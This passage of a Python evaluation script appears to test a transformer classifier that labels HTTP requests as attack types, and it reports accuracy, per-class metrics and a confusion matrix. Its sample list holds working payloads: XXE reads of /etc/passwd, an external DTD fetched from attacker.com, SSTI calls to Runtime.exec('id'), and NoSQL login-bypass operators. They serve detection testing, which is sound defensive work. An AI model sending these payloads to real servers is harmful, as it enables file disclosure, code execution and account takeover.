    ("xxe", "POST", "/api/svg", {"Host": "files.example.com", "User-Agent": UA_CURL, "Content-Type": "image/svg+xml"}, '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'),
    ("xxe", "POST", "/import.xml", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd"> %xxe;]><foo/>'),
    ("xxe", "POST", "/parse", {"Host": "doc.example.com", "User-Agent": UA_CURL, "Content-Type": "application/xml"}, '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a SYSTEM "file:///proc/version">]><r>&a;</r>'),
    ("xxe", "POST", "/process", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "text/xml"}, '<!DOCTYPE t [<!ENTITY x SYSTEM "netdoc:/etc/hosts">]><t>&x;</t>'),

    # ----- SSTI additional (5) -----
    ("ssti", "POST", "/preview", {"Host": "app.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/x-www-form-urlencoded"}, "tpl=%7B%7B7*%277%27%7D%7D"),
    ("ssti", "GET", "/p?t={{request.args.get('x')}}", {"Host": "tpl.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "POST", "/api/render", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"tpl":"#{T(java.lang.Runtime).getRuntime().exec(\'id\')}"}'),
    ("ssti", "GET", "/render?t=<%=Runtime.getRuntime().exec(\"id\")%>", {"Host": "tpl.example.com", "User-Agent": UA_CHROME}, ""),
    ("ssti", "POST", "/api/twig", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"tpl":"{{_self.env.registerUndefinedFilterCallback(\\"exec\\")}}"}'),

    # ----- NOSQLi additional (5) -----
    ("nosqli", "GET", "/api/users?email[$ne]=null&password[$ne]=null", {"Host": "api.example.com", "User-Agent": UA_CURL}, ""),
    ("nosqli", "POST", "/api/v2/find", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"filter":{"role":"admin","_id":{"$ne":null}}}'),
    ("nosqli", "POST", "/api/login", {"Host": "api.example.com", "User-Agent": UA_CHROME, "Content-Type": "application/json"}, '{"username":{"$regex":"^a"},"password":{"$exists":true}}'),
    ("nosqli", "POST", "/api/v1/query", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"$or":[{"role":"admin"},{"role":"superuser"}]}'),
    ("nosqli", "POST", "/api/cmd", {"Host": "api.example.com", "User-Agent": UA_CURL, "Content-Type": "application/json"}, '{"$where":"this.password == this.username"}'),
]


def build_built_in_samples() -> List[Dict[str, str]]:
    out = []
    for label, method, path, headers, body in RAW:
        out.append({"label": label, "text": compose(method, path, headers, body)})
    return out


# --------------------------------------------------------------------------- #
# Eval                                                                         #
# --------------------------------------------------------------------------- #
def load_labels_from_dir(model_dir: str) -> List[str]:
    for fname in ("label_config.json", "config.json"):
        p = os.path.join(model_dir, fname)
        if os.path.exists(p):
            with open(p) as f:
                blob = json.load(f)
            id2 = blob.get("id2label")
            if id2:
                return [v for _, v in sorted(((int(k), v) for k, v in id2.items()))]
    raise SystemExit(f"no id2label found in {model_dir}")


def predict_all(model, tokenizer, texts: List[str], device: str, max_length: int = 256, batch_size: int = 16):
    out = []
    for i in range(0, len(texts), batch_size):
        chunk = texts[i:i + batch_size]
        enc = tokenizer(
            chunk, truncation=True, max_length=max_length, padding=True,
            return_tensors="pt", return_token_type_ids=False,
        ).to(device)
        with torch.no_grad():
            logits = model(**enc).logits
            probs = torch.softmax(logits, dim=-1).cpu().tolist()
        out.extend(probs)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", required=True, help="path to final_model_v5 directory")
    ap.add_argument("--samples", help="optional JSONL with {label,text} per line")
    ap.add_argument("--max-length", type=int, default=256)
    ap.add_argument("--batch-size", type=int, default=16)
    args = ap.parse_args()

    if not os.path.isdir(args.model):
        raise SystemExit(f"model dir not found: {args.model}")

    labels = load_labels_from_dir(args.model)
    print(f"[load] labels = {labels}")

    if args.samples:
        with open(args.samples) as f:
            samples = [json.loads(line) for line in f if line.strip()]
    else:
        samples = build_built_in_samples()

    # Sanity: every gold label must be known to the model.
    unknown = sorted({s["label"] for s in samples} - set(labels))
    if unknown:
        raise SystemExit(f"unknown gold label(s) not in model: {unknown}")

    device = "cuda" if torch.cuda.is_available() else "cpu"
    print(f"[load] device={device}  model={args.model}")
    t0 = time.time()
    tokenizer = AutoTokenizer.from_pretrained(args.model)
    model = AutoModelForSequenceClassification.from_pretrained(args.model).to(device).eval()
    print(f"[load] ready in {time.time() - t0:.2f}s, num_labels={model.config.num_labels}")

    texts = [s["text"] for s in samples]
    gold = [s["label"] for s in samples]

    t1 = time.time()
    probs = predict_all(model, tokenizer, texts, device, args.max_length, args.batch_size)
    dt = time.time() - t1
    print(f"[infer] {len(samples)} samples in {dt:.2f}s ({1000*dt/len(samples):.1f} ms/sample)\n")

    label2id = {l: i for i, l in enumerate(labels)}
    pred_ids = [int(max(range(len(p)), key=lambda i: p[i])) for p in probs]
    pred = [labels[i] for i in pred_ids]
    confs = [probs[i][pred_ids[i]] for i in range(len(samples))]

    # ----- overall accuracy -----
    correct = sum(1 for g, p in zip(gold, pred) if g == p)
    acc = correct / len(samples)
    print(f"OVERALL  accuracy = {correct}/{len(samples)} = {acc:.4f}")

    # ----- per-class metrics -----
    tp = defaultdict(int)
    fp = defaultdict(int)
    fn = defaultdict(int)
    support = defaultdict(int)
    for g, p in zip(gold, pred):
        support[g] += 1
        if g == p:
            tp[g] += 1
        else:
            fp[p] += 1
            fn[g] += 1

    print("\nPER-CLASS")
    print(f"{'class':<16} {'support':>7} {'P':>7} {'R':>7} {'F1':>7}")
    macro_p = macro_r = macro_f = 0.0
    classes_seen = sorted(set(gold) | set(pred))
    for c in classes_seen:
        p = tp[c] / (tp[c] + fp[c]) if (tp[c] + fp[c]) else 0.0
        r = tp[c] / (tp[c] + fn[c]) if (tp[c] + fn[c]) else 0.0
        f1 = 2 * p * r / (p + r) if (p + r) else 0.0
        sup = support[c]
        print(f"{c:<16} {sup:>7d} {p:>7.3f} {r:>7.3f} {f1:>7.3f}")
        macro_p += p; macro_r += r; macro_f += f1
    n = len(classes_seen)
    if n:
        print(f"{'macro avg':<16} {len(samples):>7d} {macro_p/n:>7.3f} {macro_r/n:>7.3f} {macro_f/n:>7.3f}")

    # ----- attack/normal binary view -----
    bin_tp = bin_tn = bin_fp = bin_fn = 0
    for g, p in zip(gold, pred):
        g_atk = g != "normal"
        p_atk = p != "normal"
        if g_atk and p_atk: bin_tp += 1
        elif not g_atk and not p_atk: bin_tn += 1
        elif not g_atk and p_atk: bin_fp += 1
        else: bin_fn += 1
    print("\nBINARY (attack vs normal)")
    print(f"  TP={bin_tp}  TN={bin_tn}  FP={bin_fp}  FN={bin_fn}")
    if bin_tp + bin_fp:
        print(f"  attack precision = {bin_tp/(bin_tp+bin_fp):.3f}")
    if bin_tp + bin_fn:
        print(f"  attack recall    = {bin_tp/(bin_tp+bin_fn):.3f}")

    # ----- confusion matrix -----
    print("\nCONFUSION MATRIX  (rows = gold, cols = pred)")
    header = "{:<16}".format("") + "".join("{:>10}".format(c[:9]) for c in classes_seen)
    print(header)
    for g in classes_seen:
        row = ["{:<16}".format(g)]
        for p in classes_seen:
            n_ = sum(1 for go, pr in zip(gold, pred) if go == g and pr == p)
            row.append("{:>10d}".format(n_))
        print("".join(row))

    # ----- misclassified samples -----
    misses = [(i, gold[i], pred[i], confs[i]) for i in range(len(samples)) if gold[i] != pred[i]]
    if misses:
        print(f"\nMISCLASSIFIED ({len(misses)})")
        for i, g, p, c in misses:
            top3 = sorted(enumerate(probs[i]), key=lambda x: -x[1])[:3]
            top3_str = ", ".join(f"{labels[idx]}={pr:.3f}" for idx, pr in top3)
            text_preview = samples[i]["text"].replace("\n", " ⏎ ")
            if len(text_preview) > 140:
                text_preview = text_preview[:140] + "…"
            print(f"  [#{i:03d}] gold={g:<14} pred={p:<14} conf={c:.3f}  top3={top3_str}")
            print(f"          text: {text_preview}")
    else:
        print("\nMISCLASSIFIED: none")

    sys.exit(0 if not misses else 1)


if __name__ == "__main__":
    main()
